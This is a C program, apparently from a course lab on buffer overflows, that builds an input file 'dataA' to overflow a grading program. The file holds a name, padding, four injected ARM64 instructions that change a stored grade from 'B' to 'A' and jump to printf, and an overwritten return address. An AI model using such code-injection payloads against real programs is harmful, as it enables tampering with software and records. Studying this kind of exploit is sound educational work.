#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include "miniassembler.h"

int main(void){
    int i;
    unsigned long uiData;
    FILE *psFile;
    unsigned int adr;
    unsigned int mov;
    unsigned int strb;
    unsigned int b;
    /*address where grade='B'*/
    uiData = 0x420068;
    /* adr x0, [sp, grade] */
    adr = MiniAssembler_adr(0, 0x420044, 0x42006C);
    /* mov w1, "A" */
    mov = MiniAssembler_mov(1, 0x00000041);
    /* strb w1, [x0] */
    strb = MiniAssembler_strb(1, 1);
    /* b printf */
    b = MiniAssembler_b(0x400864, 0x420074);
    
    psFile = fopen("dataA", "w");
    
    fprintf(psFile,"Chris Paucar");
    
    for(i = 0; i < 4; i++){
        putc('\0', psFile);
    }
    
    fwrite(&mov, sizeof(unsigned int), 1, psFile);
    fwrite(&adr, sizeof(unsigned int), 1, psFile);
    fwrite(&strb, sizeof(unsigned int), 1, psFile);
    fwrite(&b, sizeof(unsigned int), 1, psFile);

    for(i = 0; i < 15; i++){
        putc('\0', psFile);
    }

    fwrite(&uiData, sizeof(unsigned long), 1, psFile);
    fclose(psFile);
    
    return 0;
}
